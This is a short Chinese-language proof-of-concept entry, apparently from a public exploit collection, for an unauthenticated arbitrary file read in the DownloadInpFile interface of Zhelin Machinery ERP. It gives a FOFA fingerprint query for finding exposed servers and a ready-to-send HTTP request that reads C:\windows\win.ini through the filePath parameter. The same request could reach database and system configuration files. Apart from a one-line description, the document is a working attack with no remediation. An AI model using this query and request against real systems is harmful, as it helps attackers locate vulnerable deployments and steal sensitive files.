# 哲霖机械ERP接口DownloadInpFile存在任意文件读取漏洞

哲霖机械ERP DownloadInpFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="Api/UserApi/GetUserName"
```

## poc

```javascript
GET /Basics/DownloadInpFile?filePath=C:\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![46554740fd4b4fe7abd8dca35c7e629b.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409132235284.png)